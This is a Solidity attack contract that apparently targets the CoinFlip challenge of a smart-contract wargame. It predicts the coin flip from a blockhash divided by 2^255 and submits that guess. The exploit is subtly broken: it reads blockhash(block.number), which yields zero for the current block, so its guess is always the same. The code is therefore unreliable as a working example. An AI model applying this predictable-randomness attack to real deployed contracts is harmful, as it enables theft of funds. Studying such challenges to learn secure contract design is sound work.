import '../Fallback/SafeMath.sol';
import './CoinFlip.sol';
contract AttackCoinFlip{
    using SafeMath for uint256;
    uint256 public guessingValue;
    bool public guessing;

    function attack(address _contract) public returns(bool) {
        uint256 tmpOfCurrent = uint256(blockhash(block.number));
        guessingValue = tmpOfCurrent.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);    
        guessing = guessingValue == 1 ? true : false;    
        bool result = false;
        CoinFlip C = CoinFlip(_contract);
        result = C.flip(guessing);
        return result;
    }
    
}

